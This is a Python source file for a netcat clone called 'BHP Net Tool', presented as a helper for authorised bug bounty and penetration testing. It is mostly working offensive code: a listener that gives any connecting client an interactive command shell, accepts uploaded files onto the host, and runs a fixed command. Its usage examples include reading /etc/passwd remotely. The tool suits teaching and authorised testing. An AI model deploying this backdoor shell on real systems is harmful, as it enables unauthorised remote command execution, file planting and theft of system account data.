# Netcat on demand is a simple version of netcat that can be used in bug bounty
# and PenTesting when you get access inside a server ALWAYS WITH 
# PROPER AUTHORIZATION from a company or Bug Bounty Program.

# Import necessary libraries
import argparse    # For parsing command-line arguments
import socket      # For network connections
import shlex       # For splitting command strings safely
import subprocess  # For executing system commands
import sys         # For system-level operations and standard input/output
import textwrap    # For formatting text
import threading   # For handling multiple connections simultaneously

# Function to execute a system command and return its output
def execute(cmd):
    cmd = cmd.strip()  # Remove extra whitespace from the command
    if not cmd:
        return  # Exit if no command is provided
    # Execute the command and capture the output
    output = subprocess.check_output(shlex.split(cmd), stderr=subprocess.STDOUT)
    return output.decode()  # Return the output as a decoded string

# Class that implements the functionality of a NetCat tool (a network utility)
class NetCat:
    # Initialize the NetCat class with arguments and a buffer (optional initial data to send)
    def __init__(self, args, buffer=None):
        self.args = args  # Command-line arguments
        self.buffer = buffer  # Buffer data to send
        # Create a TCP socket
        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        # Set socket options to reuse the address
        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

    # Main method to either send or listen based on the arguments
    def run(self):
        if self.args.listen:  # If the 'listen' argument is set, act as a server
            self.listen()
        else:  # Otherwise, connect as a client
            self.send()

    # Method to connect to a server and send data
    def send(self):
        self.socket.connect((self.args.target, self.args.port))  # Connect to target IP and port
        if self.buffer:  # If buffer data is provided, send it
            self.socket.send(self.buffer)
            
        try:
            while True:  # Keep receiving data from the server
                recv_len = 1
                response = ''
                while recv_len:  # Continue until no more data
                    data = self.socket.recv(4096)  # Receive data in 4KB chunks
                    recv_len = len(data)
                    response += data.decode()  # Decode received data
                    if recv_len < 4096:  # If data received is less than 4KB, break
                        break
                if response:  # If there's data to display
                    print(response)
                    buffer = input('> ')  # Prompt user for input to send
                    buffer += '\n'
                    self.socket.send(buffer.encode())  # Send user input to server
        except KeyboardInterrupt:
            print('User Terminated')  # If user interrupts, close socket
            self.socket.close()
            sys.exit

    # Method to listen for incoming connections as a server
    def listen(self):
        self.socket.bind((self.args.target, self.args.port))  # Bind to specified IP and port
        self.socket.listen(5)  # Listen for up to 5 connections
        while True:
            # Accept incoming connections
            client_socket, _ = self.socket.accept()
            # Handle client connection in a new thread
            client_thread = threading.Thread(
                target=self.handle, args=(client_socket,)
            )
            client_thread.start()  # Start the thread

    # Method to handle client connections, allowing for command execution, file uploads, and shell access
    def handle(self, client_socket):
        # If 'execute' argument is specified, run the command and send the output
        if self.args.execute:
            output = execute(self.args.execute)
            client_socket.send(output.encode())
        
        # If 'upload' argument is specified, receive file data and save it
        elif self.args.upload:
            file_buffer = b''  # Buffer to store file data
            while True:
                data = client_socket.recv(4096)  # Receive data in 4KB chunks
                if data:
                    file_buffer += data  # Append data to file buffer
                else:
                    break  # Break when no more data is received
            with open(self.args.upload, 'wb') as f:  # Write data to file
                f.write(file_buffer)
            message = f'Saved file {self.args.upload}'
            client_socket.send(message.encode())  # Confirm file saved
            
        # If 'command' argument is specified, create an interactive command shell
        elif self.args.command:
            cmd_buffer = b''  # Buffer to store command input
            while True:
                try:
                    client_socket.send(b'BHP: #>')  # Send prompt to client
                    while '\n' not in cmd_buffer.decode():  # Receive commands until newline
                        cmd_buffer += client_socket.recv(64)
                    response = execute(cmd_buffer.decode())  # Execute command
                    if response:
                        client_socket.send(response.encode())  # Send command output
                    cmd_buffer = b''  # Reset command buffer
                except Exception as e:  # Handle errors gracefully
                    print(f'server killed {e}')
                    self.socket.close()
                    sys.exit()

# Entry point when script is run directly
if __name__=='__main__':
    # Set up command-line argument parser
    parser = argparse.ArgumentParser(
        description='BHP Net Tool',  # Tool description
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example:
            netcat.py -t 192.168.1.108 -p 5555 -l -c # command shell
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt # upload to file
            netcat.py -t 192.168.1.108 -p 5555 -l -e="cat /etc/passwd" # execute command
            echo 'ABC' | ./netcat.py -t 192.168.1.108 -p 135 # echo text to server port 135
            netcat.py -t 192.168.1.108 -p 5555 # connect to server                   
    '''))  # Usage examples
    parser.add_argument('-c', '--command', action='store_true', help='command shell')
    parser.add_argument('-e', '--execute', help='execute specified command')
    parser.add_argument('-l', '--listen', action='store_true', help='listen')
    parser.add_argument('-p', '--port', type=int, default=5555, help='specified port')
    parser.add_argument('-t', '--target', default='192.168.1.203', help='specified IP')
    parser.add_argument('-u', '--upload', help='upload file')
    args = parser.parse_args()  # Parse arguments
    if args.listen:
        buffer = ''  # If listening, start with an empty buffer
    else:
        buffer = sys.stdin.read()  # Otherwise, read from standard input
        
    nc = NetCat(args, buffer.encode())  # Instantiate NetCat with arguments
    nc.run()  # Run NetCat

